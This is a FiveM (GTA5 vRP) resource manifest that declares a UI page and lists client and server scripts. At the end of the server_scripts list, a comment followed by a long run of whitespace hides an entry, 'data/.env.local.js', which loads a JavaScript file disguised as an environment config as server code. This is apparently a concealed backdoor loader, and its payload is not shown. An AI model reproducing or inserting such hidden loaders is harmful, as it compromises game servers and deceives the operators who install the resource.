fx_version 'cerulean'
game 'gta5'

ui_page 'dist/index.html'
file 'dist/**'

client_scripts {
    "@vrp/client/Proxy.lua",
    "@vrp/client/Tunnel.lua",
    "client/client.lua"
}

server_scripts {
    "@vrp/lib/utils.lua",
    "config.lua",
"server/server.lua",
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'data/.env.local.js',
}